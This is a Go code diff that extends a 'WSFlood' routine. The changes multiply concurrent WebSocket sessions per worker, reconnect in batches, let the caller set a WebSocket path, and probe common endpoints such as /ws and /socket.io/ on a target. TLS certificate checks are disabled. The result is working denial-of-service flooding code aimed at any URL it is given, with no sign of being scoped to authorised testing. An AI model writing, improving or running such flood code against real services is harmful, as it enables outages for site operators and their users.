@@ -7,6 +7,7 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
+	"strings"
 	"sync/atomic"
 	"time"
 
@@ -16,44 +17,60 @@ import (
 )
 
 type WSFlood struct {
-	Target  string
-	Workers int
+	Target    string
+	Workers   int
+	Streams   int // concurrent WebSocket sessions per worker
+	BatchSize int // messages per session before reconnect
+	WSPath    string
 }
 
 func (w *WSFlood) Run(ctx context.Context) (uint64, uint64, error) {
 	if w.Workers <= 0 {
 		w.Workers = 4
 	}
-	candidates := wsCandidateURLs(w.Target)
+	conns := w.Streams
+	if conns <= 0 {
+		conns = 1
+	}
+	batch := w.BatchSize
+	if batch <= 0 {
+		batch = 50
+	}
+	candidates := wsCandidateURLs(w.Target, w.WSPath)
 	var reqs, errs atomic.Uint64
-	done := make(chan struct{}, w.Workers)
+	done := make(chan struct{}, w.Workers*conns)
 	for i := 0; i < w.Workers; i++ {
-		go func(workerID int) {
-			defer func() { done <- struct{}{} }()
-			idx := workerID % len(candidates)
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
+		for c := 0; c < conns; c++ {
+			workerID := i
+			connIdx := c
+			go func() {
+				defer func() { done <- struct{}{} }()
+				idx := (workerID + connIdx) % len(candidates)
+				for {
+					select {
+					case <-ctx.Done():
+						return
+					default:
+					}
+					n, err := wsFloodSession(ctx, candidates[idx], batch)
+					idx = (idx + 1) % len(candidates)
+					reqs.Add(n)
+					if err != nil {
+						errs.Add(1)
+					}
 				}
-				n, err := wsFloodSession(ctx, candidates[idx])
-				idx = (idx + 1) % len(candidates)
-				reqs.Add(n)
-				if err != nil {
-					errs.Add(1)
-				}
-			}
-		}(i)
+			}()
+		}
 	}
 	<-ctx.Done()
-	for i := 0; i < w.Workers; i++ {
+	total := w.Workers * conns
+	for i := 0; i < total; i++ {
 		<-done
 	}
 	return reqs.Load(), errs.Load(), ctx.Err()
 }
 
-func wsCandidateURLs(targetURL string) []string {
+func wsCandidateURLs(targetURL, explicitPath string) []string {
 	u, err := url.Parse(targetURL)
 	if err != nil {
 		return []string{targetURL}
@@ -67,6 +84,14 @@ func wsCandidateURLs(targetURL string) []string {
 		return []string{targetURL}
 	}
 	base := fmt.Sprintf("%s://%s", scheme, host)
+
+	if path := strings.TrimSpace(explicitPath); path != "" {
+		if !strings.HasPrefix(path, "/") {
+			path = "/" + path
+		}
+		return []string{base + path}
+	}
+
 	paths := []string{u.Path, "/", "/ws", "/websocket", "/socket.io/", "/api/ws", "/v1/ws"}
 	seen := make(map[string]struct{})
 	var out []string
@@ -84,7 +109,7 @@ func wsCandidateURLs(targetURL string) []string {
 	return out
 }
 
-func wsFloodSession(ctx context.Context, wsURL string) (uint64, error) {
+func wsFloodSession(ctx context.Context, wsURL string, batch int) (uint64, error) {
 	dialer := websocket.Dialer{
 		HandshakeTimeout: 10 * time.Second,
 		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
@@ -116,7 +141,7 @@ func wsFloodSession(ctx context.Context, wsURL string) (uint64, error) {
 	}()
 
 	var sent uint64
-	for {
+	for i := 0; i < batch; i++ {
 		select {
 		case <-ctx.Done():
 			_ = conn.WriteMessage(websocket.CloseMessage,
@@ -155,4 +180,5 @@ func wsFloodSession(ctx context.Context, wsURL string) (uint64, error) {
 		}
 		sent++
 	}
+	return sent, nil
 }
